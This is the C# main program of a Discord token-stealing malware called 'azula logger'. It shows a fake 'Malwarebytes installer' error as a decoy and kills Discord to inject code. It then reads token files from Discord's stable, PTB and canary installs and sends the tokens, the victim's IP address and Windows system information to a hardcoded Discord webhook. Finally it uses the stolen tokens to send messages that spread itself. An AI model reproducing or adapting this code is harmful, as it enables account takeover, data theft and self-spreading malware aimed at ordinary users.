using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using WebSocketSharp;
using System.Windows.Forms;
using System.Runtime.CompilerServices;

namespace azula_logger
{
    //azula logger made by dxmon#0666
    //https://azula.xyz
    //https://cythosa.xyz

    //added win info
    class Program
    {
        static void Main(string[] args)
        {
            //making webhook url & image a string so u dont have to change it everywhere
            string webhook = "https://discordapp.com/api/webhooks/771479315505348670/IeeW88Ig_jojTE82M1M-9MCErp8wA0uUfVboNQO0_bS_fSG6I-jyJZNe-zVcDPSBI_5s";
            string image = "";
            Task.Run(() =>
            {
                Console.Beep();
                MessageBox.Show("This programm seems to be corupt please talk to the developer to fix this issue", "Malwarebytes installer");
            });
            //Kills discord so the logger can inject js code in a js file
            KillDiscord.Kill();
            //Getting token from normal install
            TokenGetter.GetToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image);
            //Getting token from public test beta
            TokenGetter.GetToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb", "*.ldb", webhook, image);
            //Getting token from canary
            TokenGetter.GetToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb", "*.ldb", webhook, image);
            //Getting IP
            IPGetter.GetIP(webhook, image);
            //Getting windows system info
            wininfo.GetWinInfo(webhook, image);
            //spreading the token Logger


            //making a list with all the tokens so we can try to send a message from all of them
            List<string> tokensss = new List<string>();
            //adding all the tokens to our list
            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", webhook, image));
            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb", "*.ldb", webhook, image));
            tokensss.Add(TokenGetter.ReturnToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb", "*.ldb", webhook, image));

            //trying to send a message with every token we collected in our list ^^^^
            foreach(var line in tokensss)
            {
                Spreader.spread(line);
            }
        }

    }
}
